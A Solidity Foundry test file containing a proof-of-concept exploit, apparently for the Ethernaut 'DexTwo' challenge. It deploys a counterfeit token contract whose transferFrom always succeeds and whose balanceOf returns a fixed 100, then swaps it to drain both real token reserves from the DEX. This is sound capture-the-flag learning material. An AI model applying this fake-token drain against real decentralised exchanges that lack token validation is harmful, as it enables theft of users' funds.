// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {DexTwo,SwappableTokenTwo} from "src/DexTwo.sol";

contract DexTwo_POC is Test {
    DexTwo _dextwo;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    mytoken _mytoken;
    function init() private{
        vm.startPrank(address(0x10));
        _dextwo = new DexTwo();
        token1 = new SwappableTokenTwo(address(_dextwo), "Token1", "TKN1", 1000);
        token2 = new SwappableTokenTwo(address(_dextwo), "Token2", "TKN2", 1000);
        _dextwo.setTokens(address(token1), address(token2));
        _dextwo.approve(address(_dextwo), 1000);
        _dextwo.add_liquidity(address(token1), 100);
        _dextwo.add_liquidity(address(token2), 100);
        token1.transfer(address(this), 10);
        token2.transfer(address(this), 10);
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_DexTwo_POC() public{
        _mytoken = new mytoken();
        _dextwo.swap(address(_mytoken), address(token1), 100);
        _dextwo.swap(address(_mytoken), address(token2), 100);
        console.log("Success:",token1.balanceOf(address(_dextwo))==0 && token2.balanceOf(address(_dextwo))==0);
    }
        
}

contract mytoken {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        return true;
    }
    function balanceOf(address account) external view returns (uint256) {
        return 100;
    }
}
